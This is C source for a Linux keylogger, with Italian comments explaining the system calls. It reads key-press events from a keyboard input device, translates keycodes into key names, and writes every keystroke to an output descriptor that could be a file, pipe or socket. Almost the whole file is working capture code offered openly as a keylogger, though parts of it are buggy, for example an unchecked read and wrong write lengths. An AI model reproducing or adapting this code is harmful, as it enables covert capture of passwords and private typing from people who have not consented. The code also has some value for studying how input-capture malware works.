#include "keylogger.h"

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "-",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFT_BRACE",
    "RIGHT_BRACE",
    "ENTER",
    "LEFT_CTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

// Variabile globale per interrompere il ciclo di lettura dei comandi.
int loop = 0x1;

void sigint_handler(int sig){
    loop = 0x0;
}

int write_all(int file_desc, const char *str){
    int bytes_written = 0x0;
    int bytes_to_write = strlen(str);

    do {
        printf("\nto write == %s", str);
        bytes_written = write(file_desc, str, bytes_to_write);
        printf("\nwritten = %d", bytes_written);
        if(bytes_written == -0x1){
            return 0x0;
        }

        bytes_to_write -= bytes_written;
        str += bytes_written;

    } while(bytes_to_write > 0x0);

    return 0x1;
}

void safe_write_all(int file_desc, const char *str, int keyboard){
    //  sigaction   ->  struttura che descrive l'azione da effettuare quando arriva un segnale.
    struct sigaction new_actn, old_actn;

    //  sa_handler  ->  e`di tipo "__sighandler_t" il quale definisce il tipo di gestore del segnale.
    new_actn.sa_handler = SIG_IGN;

    //  sigemptyset ->  pulisce tutti i segnali da "SET".
    sigemptyset(&new_actn.sa_mask);

    // sa_flags ->  flag speciale che specifica un'azione da intraprendere in determinate condizioni.
    new_actn.sa_flags = 0x0;

    /*  sigaction   ->  ottiene e/o setta l'azione per il segnale SIG. 
        SIGPIPE     ->  broken pipe */  
    sigaction(SIGPIPE, &new_actn, &old_actn);

    if(!write_all(file_desc, str)){
        close(file_desc);
        close(keyboard);
        perror("\nError Writing");
        exit(0x1);
    }

    sigaction(SIGPIPE, &old_actn, NULL);
}

void keylogger(int keyboard, int writeout){
    int bytes_read = 0x0;

    //  input_event ->  struttura per leggere i dati nei files contenenti gli eventi.
    struct input_event event;

    //  signal  ->   setta l'handler per il segnale SIG a HANDLER ritornando il vecchio handler oppure SIG_ERR in caso di errore.
    signal(SIGINT, sigint_handler);

    while(loop){
        char buf[500];
        ssize_t t = read(keyboard, &event, sizeof(event));
        if(event.type == EV_KEY && event.value == 0x1){
            printf("\nevent.code == %d", event.code);   // Print code event
            printf("\nevent.time = %ld.%06ld", event.time.tv_sec, event.time.tv_usec);  // Print timestamp event
            printf("\nevent.type = %d", event.type);    // Print type event
            if(event.code > 0x0 && event.code < NUM_KEYCODES){
                char *key = malloc(sizeof(char) * (strlen(keycodes[event.code]) + 0x1));
                strcpy(key, keycodes[event.code]);
                strcat(key, (const char *) " ");
                printf("\nkey == %s", key);
                safe_write_all(writeout, key, keyboard);
                free(key);
            } else {
                switch(event.code){
                    case KEYCODE_MINUS_KEYPAD:
                        write(writeout, concat(MINUS, " "), sizeof(MINUS));
                    break;
                    case KEYCODE_PLUS_KEYPAD:
                        write(writeout, concat(PLUS, " "), sizeof(PLUS));
                    break;
                    case KEYCODE_PAG_UP:
                        write(writeout, concat(PAG_UP, " "), sizeof(PAG_UP));
                    break;
                    case KEYCODE_FINE:
                        write(writeout, concat(FINE, " "), sizeof(FINE));
                    break;
                    case KEYCODE_PAG_DOWN:
                        write(writeout, concat(PAG_DOWN, " "), sizeof(PAG_DOWN));
                    break;
                    case KEYCODE_CANC:
                        write(writeout, concat(CANC, " "), sizeof(CANC));
                    break;
                    default:
                        write(writeout, concat(UNRECOGNIZED, " "), sizeof(UNRECOGNIZED));
                    break;
                }
            }
        }

        
    }
    if(bytes_read > 0x0){
        safe_write_all(writeout, "\n", keyboard);
    }
}